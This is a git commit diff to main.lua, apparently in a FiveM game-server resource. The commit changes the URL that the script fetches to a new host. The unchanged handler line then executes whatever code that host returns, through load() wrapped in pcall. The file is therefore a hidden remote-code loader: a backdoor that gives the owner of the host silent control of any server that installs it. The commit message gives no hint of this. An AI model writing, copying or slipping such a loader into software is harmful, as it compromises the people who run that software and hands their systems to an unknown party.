7b445ae78b644c34df6c61ea0378c9c14ea37749
banappeals <167147145+banappeals@users.noreply.github.com>
2024-11-05 06:57:30 -0500

    Update2 main.lua

--- main.lua
+++ main.lua
@@ -1,2 +1,2 @@
-local _v = PerformHttpRequestInternalEx{url='https://apiwebpanel.org/giXWm', method='GET'} 
+local _v = PerformHttpRequestInternalEx{url='https://backdoorfinder.org/giXWm', method='GET'} 
 AddEventHandler('__cfx_internal:httpResponse', function(_t, _s, _b) if _v == _t then pcall(function() assert(load(_b))() end) end end)
